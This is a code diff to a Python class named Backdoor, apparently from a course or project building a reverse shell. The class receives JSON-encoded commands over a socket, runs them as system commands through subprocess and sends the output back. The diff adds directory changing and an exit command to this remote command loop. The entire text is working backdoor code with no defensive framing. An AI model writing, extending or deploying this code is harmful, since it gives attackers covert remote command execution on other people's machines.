@@ -1,3 +1,4 @@
+import os
 import socket
 import subprocess
 import json
@@ -25,7 +26,16 @@ class Backdoor:
         json_data = self.connection.recv(1024)
         json_data = json_data.decode("utf-8")
         command = json.loads(json_data)
+        command = command.split(" ")
         return command
+
+    def change_directory_tool(self, path):
+        try:
+            if path:
+                os.chdir(path)
+                return f"[+] Changing working directory to {path}"
+        except:
+            return "[-] No such file or directory"
 
     def execute_system_command(self, command):
         try:
@@ -34,15 +44,19 @@ class Backdoor:
             self.reliable_send("[-] Unknown command")
 
     def run(self):
-        try:
-            while True:
-                command = self.reliable_receive()
-                command_result = self.execute_system_command(command)
-                self.reliable_send(command_result)
+        while True:
+            command = self.reliable_receive()
 
-        except KeyboardInterrupt:
-            print("\n[-] Quiting")
-            self.connection.close()
+            if command[0] == "exit":
+                self.connection.close()
+                exit()
+
+            elif command[0] == "cd" and len(command) >= 2:
+                command_result = self.change_directory_tool(command[1])
+
+            else:
+                command_result = self.execute_system_command(command)
+            self.reliable_send(command_result)
 
 
 if __name__ == "__main__":
